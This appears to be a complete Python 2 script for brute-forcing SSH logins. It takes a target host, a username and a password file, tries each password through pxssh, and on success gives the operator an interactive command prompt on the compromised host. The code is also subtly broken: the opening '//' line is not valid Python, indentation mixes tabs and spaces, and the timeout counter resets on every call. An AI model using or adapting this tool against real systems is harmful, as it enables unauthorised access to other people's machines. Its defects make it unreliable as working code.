//basic ssh bruteforce

import pxssh
import argparse
import time

def connect(host, user, password):
    global Found
    Fails = 0

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print 'Password Found: ' + password
	return s
    except Exception, e:
	if Fails > 5:
	    print "!!! Too Many Socket Timeouts" 
	    exit(0)
	elif 'read_nonblocking' in str(e):
	    Fails += 1
            time.sleep(5)
            return connect(host, user, password)
	elif 'synchronize with original prompt' in str(e):
	    time.sleep(1)
	    return connect(host, user, password)
	return None

def main():
    parser = argparse.ArgumentParser()

    parser.add_argument("host", help="Specify Target Host")
    parser.add_argument("user", help="Specify Target User")
    parser.add_argument("file", help="Specify Password File")
    
    args = parser.parse_args()

    if args.host and args.user and args.file:
    	with open(args.file, 'r') as infile:
    	    for line in infile:
                password = line.strip('\r\n')
	        print "Testing: "+str(password)
                con = connect(args.host, args.user, password)
		if con:
		    print "[SSH connected, Issue commands (q or Q) To quit]"
		    command = raw_input(">")
		    while command != 'q' and command != 'Q':
			con.sendline (command)
            		con.prompt()
            		print con.before 
			command = raw_input(">")
    else:
        print parser.usage
        exit(0)

if __name__ == '__main__':
    main()



